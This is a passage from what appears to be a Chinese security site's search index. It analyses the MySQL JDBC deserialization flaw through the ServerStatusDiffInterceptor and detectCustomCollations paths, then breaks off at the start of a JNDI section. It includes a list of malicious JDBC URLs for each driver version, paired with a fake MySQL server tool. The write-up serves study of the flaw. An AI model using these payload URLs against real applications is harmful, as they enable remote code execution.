\u6211\u4eec\u518d\u6765\u4e86\u89e3\u4e00\u4e0b BIT \u548c BLOB \u8fd9\u4e24\u79cdMYSQL\u7684\u6570\u636e\u683c\u5f0f: BLOB \uff1a BLOB \u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u957f\u6587\u672c\u6570\u636e\uff0c\u5927\u5c0f\u662f0-65535 bytes BIT \uff1a Bit\u6570\u636e\u7c7b\u578b\u7528\u6765\u5b58\u50a8bit\u503c BIT(M)\u4ee3\u8868\u53ef\u4ee5\u5b58\u50a8M\u4e2abit\uff0cM\u7684\u53d6\u503c\u8303\u56f4\u4e3a1\u523064 \u5982\u679c\u624b\u5de5\u6307\u5b9abit\u503c\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528b'value'\u683c\u5f0f\uff0c\u6bd4\u5982b'111'\u548c b'10000000'\u5206\u522b\u4ee3\u88687\u548c128 \u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u653e\u5728\u4e86BLOB\u8fd9\u4e2a\u6570\u636e\u683c\u5f0f\uff0c\u518d\u5206\u6790\u4e00\u4e0b\u4ee3\u7801\u903b\u8f91\uff0c\u5148\u83b7\u53d6\u7ed3\u679c\u96c6\u4e2d\u7684\u4e00\u5217\uff0c\u5224\u65ad\u5176\u7684mysql\u6570\u636e\u7c7b\u578b: \u63a5\u4e0b\u6765\u662f\u5224\u65ad\u51e0\u4e2a\u6761\u4ef6: 1. filed\u662fbinary\u6216\u8005blob 2. \u914d\u7f6e\u4e2d\u7684autoDeserialize\u4e3a true 3. data \u6ee1\u8db3\u7b2c\u4e00\u4f4d\u4e3a -84 \u7b2c\u4e8c\u4f4d\u4e3a -19 \uff0c\u5b9e\u9645\u4e0a\u4e3ajava\u5e8f\u5217\u5316\u5bf9\u8c61\u9b54\u672f\u5934: AC(0xAC == 256 - 84) ED(0xED == 256 - 19) ServerStatusDiffInterceptor\u89e6\u53d1\u65b9\u5f0f # \u901a\u8fc7\u4e0a\u9762\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u77e5\u9053\u53ea\u8981\u8c03\u7528\u5230 ResultSetImpl.getObject() \u65b9\u6cd5\uff0c\u5c31\u6709\u673a\u4f1a\u9020\u6210\u53cd\u5e8f\u5217\u5316\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u7c7b\u89e6\u53d1\u65b9\u5f0f\u7684payload(8.x\uff0c\u4e0d\u540cjdbc\u7248\u672c\u7684payload\u4e0d\u4e00\u6837): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor \u8fd9\u91cc\u4f20\u5165\u4e862\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u4e0a\u6587\u63d0\u5230\u7684 autoDeserialize \uff0c\u5c06\u5176\u8bbe\u7f6e\u4e3a true \u624d\u6709\u673a\u4f1a\u8fdb\u5165\u53cd\u5e8f\u5217\u5316\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f queryInterceptors \uff0c\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u53c2\u6570\uff0c\u901a\u8fc7\u67e5\u8be2jdbc\u7684\u6587\u6863\u77e5\u9053\u5b83\u4e00\u4e2a\u9017\u53f7\u5206\u5272\u7684Class\u5217\u8868\uff08\u5b9e\u73b0\u4e86com.mysql.cj.interceptors.QueryInterceptor\u63a5\u53e3\u7684\u7c7b\uff09\uff0c\u5728Query\u201d\u4e4b\u95f4\u201d\u8fdb\u884c\u6267\u884c\u6765\u5f71\u54cd\u7ed3\u679c\u3002\uff08\u6548\u679c\u4e0a\u6765\u770b\u662f\u5728Query\u6267\u884c\u524d\u540e\u5404\u63d2\u5165\u4e00\u6b21\u64cd\u4f5c\uff09\uff1b \u6211\u4eec\u8fd9\u91cc\u7528\u5230\u7684 ServerStatusDiffInterceptor \u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u4e86 com.mysql.cj.interceptors.QueryInterceptor \u7684\u7c7b\uff0c\u5176\u5177\u4f53\u89e6\u53d1\u65b9\u5f0f\u5982\u4e0b\uff0c\u5148\u89e6\u53d1\u4e86 ServerStatusDiffInterceptor.preProcess() \u65b9\u6cd5: \u7ee7\u7eed\u8ddf\u8fdb\uff0c\u4f1a\u8c03\u7528 ServerStatusDiffInterceptor.populateMapWithSessionStatusValues() \u65b9\u6cd5\uff0c\u5176\u4f1a\u6267\u884c SHOW SESSION STATUS \uff0c\u7136\u540e\u5c06\u7ed3\u679c\u4f20\u5165 ResultSetUtil.resultSetToMap() \u65b9\u6cd5: \u8fd9\u91cc\u6700\u7ec8\u8c03\u7528\u5230\u4e86 ResultSetImpl.getObject() \u65b9\u6cd5: detectCustomCollations\u89e6\u53d1\u65b9\u5f0f # \u8fd9\u91cc\u7684 detectCustomCollations \u662fjdbc\u94fe\u63a5\u65f6\u7684\u4e00\u4e2a\u9009\u9879\uff0c\u8fd9\u4e2a\u9009\u9879\u662f\u4ece5.1.29\u5f00\u59cb\u7684\uff0c\u7ecf\u8fc7\u4ee3\u7801\u6bd4\u5bf9\uff0c\u53ef\u4ee5\u8ba4\u4e3a detectCustomCollations \u8fd9\u4e2a\u9009\u9879\u57285.1.29\u4e4b\u524d\u4e00\u76f4\u4e3atrue\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u7c7b\u89e6\u53d1\u65b9\u5f0f\u7684payload: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true \u89e6\u53d1\u70b9\u5728 com.mysql.jdbc.ConnectionImpl \u7684 buildCollationMapping \u65b9\u6cd5\u4e2d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u9700\u8981\u6ee1\u8db32\u4e2a\u6761\u4ef6\uff1a 1. \u670d\u52a1\u5668\u7248\u672c\u5927\u4e8e\u7b49\u4e8e4.1.0 2. detectCustomCollations \u9009\u9879\u4e3a true \u540e\u7eed\u7684\u5206\u6790\u548c\u4e0a\u9762\u662f\u4e00\u6837\u7684\uff0c\u5176\u4f1a\u6267\u884c SHOW COLLATION \u8bed\u53e5\u5e76\u5c06\u5c06\u7ed3\u679c\u4f20\u5165 ResultSetUtil.resultSetToMap() \u65b9\u6cd5\uff0c\u6700\u540e\u8c03\u7528\u5230 ResultSetImpl.getObject() \u65b9\u6cd5\u3002 \u5229\u7528\u65b9\u5f0f # \u5b9e\u9645\u4e0a\u5229\u7528\u65b9\u5f0f\u5c31\u662f\u6784\u9020\u4e00\u4e2aMysql\u7684\u865a\u5047\u670d\u52a1\u5668\uff0c\u5728\u6267\u884c\u5bf9\u5e94\u8bed\u53e5\u65f6\u8fd4\u56deBLOB\u7c7b\u578b\u7684\u6570\u636e(\u6076\u610f\u7684java\u5e8f\u5217\u5316\u5bf9\u8c61)\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528\u73b0\u6709\u7684\u9879\u76ee: MySQL Fake Server \u5404\u4e2a\u7248\u672cpayload\u603b\u7ed3 # \u8fd9\u91cc\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 : ServerStatusDiffInterceptor\u89e6\u53d1\uff1a 8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 6.x(\u5c5e\u6027\u540d\u4e0d\u540c): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 5.1.11\u53ca\u4ee5\u4e0a\u76845.x\u7248\u672c\uff08\u5305\u540d\u6ca1\u6709\u4e86cj\uff09: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 5.1.10\u53ca\u4ee5\u4e0b\u76845.1.X\u7248\u672c\uff1a \u540c\u4e0a\uff0c\u4f46\u662f\u9700\u8981\u8fde\u63a5\u540e\u6267\u884c\u67e5\u8be2\u3002 5.0.x: \u8fd8\u6ca1\u6709 ServerStatusDiffInterceptor \u8fd9\u4e2a\u4e1c\u897f\u2513( \u00b4\u2200` )\u250f detectCustomCollations\u89e6\u53d1\uff1a 6.0.7\u53ca\u4ee5\u4e0a: \u4e0d\u53ef\u7528 6.0.2-6.0.6: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.40-5.1.48: \u9700\u8981\u5bf9 fnmsd/MySQL Fake Server \u9879\u76ee\u7a0d\u4f5c\u8c03\u6574\uff0c\u5c06\u7b2c\u4e09\u4e2a\u5b57\u6bb5\u4e5f\u586b\u5145\u4e3a\u5e8f\u5217\u5316\u6570\u636e\u5373\u53ef\u3002 jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.29-5.1.39: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.19-5.1.28\uff1a jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc 5.1.0-5.1.18\uff1a \u4e0d\u53ef\u7528 5.0.x: \u4e0d\u53ef\u7528 \u53c2\u8003\u6587\u7ae0 # https://www.anquanke.com/post/id/203086 https://blog.csdn.net/fnmsd/article/details/106232092 https://c014.cn/blog/java/JDBC/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://github.com/fnmsd/MySQL_Fake_Server https://xz.aliyun.com/t/10923","title":"JDBC"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#jdbc","text":"","title":"JDBC"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#\u4ec0\u4e48\u662fjdbc","text":"JDBC\u4e00\u822c\u6307Java\u6570\u636e\u5e93\u8fde\u63a5\u3002Java\u6570\u636e\u5e93\u8fde\u63a5\uff0c\uff08Java Data Base Connectivity\uff0c\u7b80\u79f0JDBC\uff09 \u662f\u4e00\u79cd\u7528\u4e8e\u6267\u884cSQL\u8bed\u53e5\u7684Java API\uff0c\u53ef\u4ee5\u4e3a\u591a\u79cd\u5173\u7cfb\u6570\u636e\u5e93\u63d0\u4f9b\u7edf\u4e00\u8bbf\u95ee\uff0c\u5b83\u7531\u4e00\u7ec4\u7528Java\u8bed\u8a00\u7f16\u5199\u7684\u7c7b\u548c\u63a5\u53e3\u7ec4\u6210\u3002JDBC\u63d0\u4f9b\u4e86\u4e00\u79cd\u57fa\u51c6\uff0c\u636e\u6b64\u53ef\u4ee5\u6784\u5efa\u66f4\u9ad8\u7ea7\u7684\u5de5\u5177\u548c\u63a5\u53e3\uff0c\u4f7f\u6570\u636e\u5e93\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u7f16\u5199\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: import java.sql.* ; public class Test { public static void main ( String [] args ) throws ClassNotFoundException , SQLException { String Driver = \"com.mysql.cj.jdbc.Driver\" ; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?serverTimezone=UTC\" ; Class . forName ( Driver ); // \u8fde\u63a5\u6570\u636e\u5e93 Connection conn = DriverManager . getConnection ( DB_URL , \"root\" , \"root\" ); // \u64cd\u4f5c\u6570\u636e\u5e93 Statement stmt = conn . createStatement (); ResultSet rs = stmt . executeQuery ( \"SELECT * FROM users\" ); while ( rs . next ()) { System . out . println ( rs . getString ( \"username\" ) + \" : \" + rs . getString ( \"password\" )); } } }","title":"\u4ec0\u4e48\u662fJDBC"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#jdbc\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7b80\u4ecb","text":"\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236JDBC\u8fde\u63a5\u8bbe\u7f6e\u9879(\u5373\u4e0a\u9762\u793a\u4f8b\u4e2d\u7684 DB_URL )\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u5176\u6307\u5411\u6076\u610fMySQL\u670d\u52a1\u5668\u8fdb\u884cObjectInputStream.readObject()\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4ece\u800cRCE\u3002 \u5177\u4f53\u70b9\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7JDBC\u8fde\u63a5MySQL\u670d\u52a1\u7aef\u65f6\uff0c\u4f1a\u6709\u51e0\u4e2a\u5185\u7f6e\u7684SQL\u67e5\u8be2\u8bed\u53e5\u8981\u6267\u884c\uff0c\u5176\u4e2d\u4e24\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u96c6\u5728MySQL\u5ba2\u6237\u7aef\u88ab\u5904\u7406\u65f6\u4f1a\u8c03\u7528ObjectInputStream.readObject()\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u53ef\u88ab\u5229\u7528\u7684\u4e24\u6761\u67e5\u8be2\u8bed\u53e5\uff1a - SHOW SESSION STATUS - SHOW COLLATION","title":"JDBC\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#jdbc\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790","text":"\u53cd\u5e8f\u5217\u5316\u70b9( readObject() )\u5728 com.mysql.cj.jdbc.result.ResultSetImpl \u7684 public Object getObject(int columnIndex) \u7684 switch \u6761\u4ef6\u8bed\u53e5\u4e2d\uff0c\u5b58\u5728\u4e24\u5904\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u4e00\u5904\u662f case BIT \uff0c\u53e6\u4e00\u5904\u662f case BLOB : \u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u4e86\u89e3\u4e00\u4e0b getObject() \u65b9\u6cd5\u7684\u4f5c\u7528\uff0c\u53c2\u8003 jdbc\u7684\u6587\u6863 ResultSet.getObject() \u65b9\u6cd5\u662f\u7528\u4e8eMySQL\u548cJava\u7c7b\u578b\u4e4b\u95f4\u7684\u7c7b\u578b\u8f6c\u6362 \u800c\u5176\u4e2d BIT \u548c BLOB \u5c31\u662fMySQL\u91cc\u7684\u4e00\u79cd\u6570\u636e\u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u6570\u636e\u4e2d\u8fd4\u56de\u4e86 BIT \u6216\u8005 BLOB \u7c7b\u578b\u7684\u6570\u636e\uff0cjdbc\u4f1a\u5c1d\u8bd5\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u4e3ajava\u5bf9\u8c61\uff0c\u8fd9\u91cc\u5c31\u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 \u6211\u4eec\u518d\u6765\u4e86\u89e3\u4e00\u4e0b BIT \u548c BLOB \u8fd9\u4e24\u79cdMYSQL\u7684\u6570\u636e\u683c\u5f0f: BLOB \uff1a BLOB \u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u957f\u6587\u672c\u6570\u636e\uff0c\u5927\u5c0f\u662f0-65535 bytes BIT \uff1a Bit\u6570\u636e\u7c7b\u578b\u7528\u6765\u5b58\u50a8bit\u503c BIT(M)\u4ee3\u8868\u53ef\u4ee5\u5b58\u50a8M\u4e2abit\uff0cM\u7684\u53d6\u503c\u8303\u56f4\u4e3a1\u523064 \u5982\u679c\u624b\u5de5\u6307\u5b9abit\u503c\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528b'value'\u683c\u5f0f\uff0c\u6bd4\u5982b'111'\u548c b'10000000'\u5206\u522b\u4ee3\u88687\u548c128 \u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u653e\u5728\u4e86BLOB\u8fd9\u4e2a\u6570\u636e\u683c\u5f0f\uff0c\u518d\u5206\u6790\u4e00\u4e0b\u4ee3\u7801\u903b\u8f91\uff0c\u5148\u83b7\u53d6\u7ed3\u679c\u96c6\u4e2d\u7684\u4e00\u5217\uff0c\u5224\u65ad\u5176\u7684mysql\u6570\u636e\u7c7b\u578b: \u63a5\u4e0b\u6765\u662f\u5224\u65ad\u51e0\u4e2a\u6761\u4ef6: 1. filed\u662fbinary\u6216\u8005blob 2. \u914d\u7f6e\u4e2d\u7684autoDeserialize\u4e3a true 3. data \u6ee1\u8db3\u7b2c\u4e00\u4f4d\u4e3a -84 \u7b2c\u4e8c\u4f4d\u4e3a -19 \uff0c\u5b9e\u9645\u4e0a\u4e3ajava\u5e8f\u5217\u5316\u5bf9\u8c61\u9b54\u672f\u5934: AC(0xAC == 256 - 84) ED(0xED == 256 - 19)","title":"JDBC\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#serverstatusdiffinterceptor\u89e6\u53d1\u65b9\u5f0f","text":"\u901a\u8fc7\u4e0a\u9762\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u77e5\u9053\u53ea\u8981\u8c03\u7528\u5230 ResultSetImpl.getObject() \u65b9\u6cd5\uff0c\u5c31\u6709\u673a\u4f1a\u9020\u6210\u53cd\u5e8f\u5217\u5316\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u7c7b\u89e6\u53d1\u65b9\u5f0f\u7684payload(8.x\uff0c\u4e0d\u540cjdbc\u7248\u672c\u7684payload\u4e0d\u4e00\u6837): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor \u8fd9\u91cc\u4f20\u5165\u4e862\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u4e0a\u6587\u63d0\u5230\u7684 autoDeserialize \uff0c\u5c06\u5176\u8bbe\u7f6e\u4e3a true \u624d\u6709\u673a\u4f1a\u8fdb\u5165\u53cd\u5e8f\u5217\u5316\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f queryInterceptors \uff0c\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u53c2\u6570\uff0c\u901a\u8fc7\u67e5\u8be2jdbc\u7684\u6587\u6863\u77e5\u9053\u5b83\u4e00\u4e2a\u9017\u53f7\u5206\u5272\u7684Class\u5217\u8868\uff08\u5b9e\u73b0\u4e86com.mysql.cj.interceptors.QueryInterceptor\u63a5\u53e3\u7684\u7c7b\uff09\uff0c\u5728Query\u201d\u4e4b\u95f4\u201d\u8fdb\u884c\u6267\u884c\u6765\u5f71\u54cd\u7ed3\u679c\u3002\uff08\u6548\u679c\u4e0a\u6765\u770b\u662f\u5728Query\u6267\u884c\u524d\u540e\u5404\u63d2\u5165\u4e00\u6b21\u64cd\u4f5c\uff09\uff1b \u6211\u4eec\u8fd9\u91cc\u7528\u5230\u7684 ServerStatusDiffInterceptor \u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u4e86 com.mysql.cj.interceptors.QueryInterceptor \u7684\u7c7b\uff0c\u5176\u5177\u4f53\u89e6\u53d1\u65b9\u5f0f\u5982\u4e0b\uff0c\u5148\u89e6\u53d1\u4e86 ServerStatusDiffInterceptor.preProcess() \u65b9\u6cd5: \u7ee7\u7eed\u8ddf\u8fdb\uff0c\u4f1a\u8c03\u7528 ServerStatusDiffInterceptor.populateMapWithSessionStatusValues() \u65b9\u6cd5\uff0c\u5176\u4f1a\u6267\u884c SHOW SESSION STATUS \uff0c\u7136\u540e\u5c06\u7ed3\u679c\u4f20\u5165 ResultSetUtil.resultSetToMap() \u65b9\u6cd5: \u8fd9\u91cc\u6700\u7ec8\u8c03\u7528\u5230\u4e86 ResultSetImpl.getObject() \u65b9\u6cd5:","title":"ServerStatusDiffInterceptor\u89e6\u53d1\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#detectcustomcollations\u89e6\u53d1\u65b9\u5f0f","text":"\u8fd9\u91cc\u7684 detectCustomCollations \u662fjdbc\u94fe\u63a5\u65f6\u7684\u4e00\u4e2a\u9009\u9879\uff0c\u8fd9\u4e2a\u9009\u9879\u662f\u4ece5.1.29\u5f00\u59cb\u7684\uff0c\u7ecf\u8fc7\u4ee3\u7801\u6bd4\u5bf9\uff0c\u53ef\u4ee5\u8ba4\u4e3a detectCustomCollations \u8fd9\u4e2a\u9009\u9879\u57285.1.29\u4e4b\u524d\u4e00\u76f4\u4e3atrue\u3002\u6211\u4eec\u6765\u770b\u770b\u8fd9\u4e2a\u7c7b\u89e6\u53d1\u65b9\u5f0f\u7684payload: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true \u89e6\u53d1\u70b9\u5728 com.mysql.jdbc.ConnectionImpl \u7684 buildCollationMapping \u65b9\u6cd5\u4e2d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u9700\u8981\u6ee1\u8db32\u4e2a\u6761\u4ef6\uff1a 1. \u670d\u52a1\u5668\u7248\u672c\u5927\u4e8e\u7b49\u4e8e4.1.0 2. detectCustomCollations \u9009\u9879\u4e3a true \u540e\u7eed\u7684\u5206\u6790\u548c\u4e0a\u9762\u662f\u4e00\u6837\u7684\uff0c\u5176\u4f1a\u6267\u884c SHOW COLLATION \u8bed\u53e5\u5e76\u5c06\u5c06\u7ed3\u679c\u4f20\u5165 ResultSetUtil.resultSetToMap() \u65b9\u6cd5\uff0c\u6700\u540e\u8c03\u7528\u5230 ResultSetImpl.getObject() \u65b9\u6cd5\u3002","title":"detectCustomCollations\u89e6\u53d1\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#\u5229\u7528\u65b9\u5f0f","text":"\u5b9e\u9645\u4e0a\u5229\u7528\u65b9\u5f0f\u5c31\u662f\u6784\u9020\u4e00\u4e2aMysql\u7684\u865a\u5047\u670d\u52a1\u5668\uff0c\u5728\u6267\u884c\u5bf9\u5e94\u8bed\u53e5\u65f6\u8fd4\u56deBLOB\u7c7b\u578b\u7684\u6570\u636e(\u6076\u610f\u7684java\u5e8f\u5217\u5316\u5bf9\u8c61)\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528\u73b0\u6709\u7684\u9879\u76ee: MySQL Fake Server","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#\u5404\u4e2a\u7248\u672cpayload\u603b\u7ed3","text":"\u8fd9\u91cc\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 : ServerStatusDiffInterceptor\u89e6\u53d1\uff1a 8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 6.x(\u5c5e\u6027\u540d\u4e0d\u540c): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 5.1.11\u53ca\u4ee5\u4e0a\u76845.x\u7248\u672c\uff08\u5305\u540d\u6ca1\u6709\u4e86cj\uff09: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc 5.1.10\u53ca\u4ee5\u4e0b\u76845.1.X\u7248\u672c\uff1a \u540c\u4e0a\uff0c\u4f46\u662f\u9700\u8981\u8fde\u63a5\u540e\u6267\u884c\u67e5\u8be2\u3002 5.0.x: \u8fd8\u6ca1\u6709 ServerStatusDiffInterceptor \u8fd9\u4e2a\u4e1c\u897f\u2513( \u00b4\u2200` )\u250f detectCustomCollations\u89e6\u53d1\uff1a 6.0.7\u53ca\u4ee5\u4e0a: \u4e0d\u53ef\u7528 6.0.2-6.0.6: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.40-5.1.48: \u9700\u8981\u5bf9 fnmsd/MySQL Fake Server \u9879\u76ee\u7a0d\u4f5c\u8c03\u6574\uff0c\u5c06\u7b2c\u4e09\u4e2a\u5b57\u6bb5\u4e5f\u586b\u5145\u4e3a\u5e8f\u5217\u5316\u6570\u636e\u5373\u53ef\u3002 jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.29-5.1.39: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc 5.1.19-5.1.28\uff1a jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc 5.1.0-5.1.18\uff1a \u4e0d\u53ef\u7528 5.0.x: \u4e0d\u53ef\u7528","title":"\u5404\u4e2a\u7248\u672cpayload\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/#\u53c2\u8003\u6587\u7ae0","text":"https://www.anquanke.com/post/id/203086 https://blog.csdn.net/fnmsd/article/details/106232092 https://c014.cn/blog/java/JDBC/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://github.com/fnmsd/MySQL_Fake_Server https://xz.aliyun.com/t/10923","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/","tags":["java","java\u5b89\u5168"],"text":"JNDI # \u53c2\u8003\u6587\u7ae0 # https://paper.seebug.org/1091/ https://xz.aliyun.com/t/10674 https://www.cnblogs.com/wk-missQ1/p/13138720.html https://cloud.tencent.com/developer/article/1441354 JNDI # JNDI (Java Naming and Directory Interface) \uff0c\u5305\u62ecNaming Service\u548cDirectory Service\u3002JNDI\u662fJava API\uff0c\u5141\u8bb8\u5ba2\u6237\u7aef\u901a\u8fc7\u540d\u79f0\u53d1\u73b0\u548c\u67e5\u627e\u6570\u636e\u3001\u5bf9\u8c61\u3002\u8fd9\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u547d\u540d\u6216\u76ee\u5f55\u670d\u52a1\u4e2d\uff0c\u4f8b\u5982\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\uff0c\u516c\u5171\u5bf9\u8c61\u8bf7\u6c42\u4ee3\u7406\u4f53\u7cfb\u7ed3\u6784\uff08CORBA\uff09\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff08LDAP\uff09\u6216\u57df\u540d\u670d\u52a1\uff08DNS\uff09\u3002 Naming Service # \u547d\u540d\u670d\u52a1\u662f\u5c06\u540d\u79f0\u4e0e\u503c\u76f8\u5173\u8054\u7684\u5b9e\u4f53\uff0c\u79f0\u4e3a\"\u7ed1\u5b9a\"\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u4f7f\u7528\"find\"\u6216\"search\"\u64cd\u4f5c\u6765\u6839\u636e\u540d\u79f0\u67e5\u627e\u5bf9\u8c61\u7684\u4fbf\u6377\u65b9\u5f0f\u3002 \u5c31\u50cfDNS\u4e00\u6837\uff0c\u901a\u8fc7\u547d\u540d\u670d\u52a1\u5668\u63d0\u4f9b\u670d\u52a1\uff0c\u5927\u90e8\u5206\u7684J2EE\u670d\u52a1\u5668\u90fd\u542b\u6709\u547d\u540d\u670d\u52a1\u5668 \u3002\u4f8b\u5982RMI Registry\u5c31\u662f\u4f7f\u7528\u7684Naming Service\u3002 Directory Service # \u662f\u4e00\u79cd\u7279\u6b8a\u7684Naming Service\uff0c\u5b83\u5141\u8bb8\u5b58\u50a8\u548c\u641c\u7d22\"\u76ee\u5f55\u5bf9\u8c61\"\uff0c\u4e00\u4e2a\u76ee\u5f55\u5bf9\u8c61\u4e0d\u540c\u4e8e\u4e00\u4e2a\u901a\u7528\u5bf9\u8c61\uff0c\u76ee\u5f55\u5bf9\u8c61\u53ef\u4ee5\u4e0e\u5c5e\u6027\u5173\u8054\uff0c\u56e0\u6b64\uff0c\u76ee\u5f55\u670d\u52a1\u63d0\u4f9b\u4e86\u5bf9\u8c61\u5c5e\u6027\u8fdb\u884c\u64cd\u4f5c\u529f\u80fd\u7684\u6269\u5c55\u3002\u4e00\u4e2a\u76ee\u5f55\u662f\u7531\u76f8\u5173\u8054\u7684\u76ee\u5f55\u5bf9\u8c61\u7ec4\u6210\u7684\u7cfb\u7edf\uff0c\u4e00\u4e2a\u76ee\u5f55\u7c7b\u4f3c\u4e8e\u6570\u636e\u5e93\uff0c\u4e0d\u8fc7\u5b83\u4eec\u901a\u5e38\u4ee5\u7c7b\u4f3c\u6811\u7684\u5206\u5c42\u7ed3\u6784\u8fdb\u884c\u7ec4\u7ec7\u3002\u53ef\u4ee5\u7b80\u5355\u7406\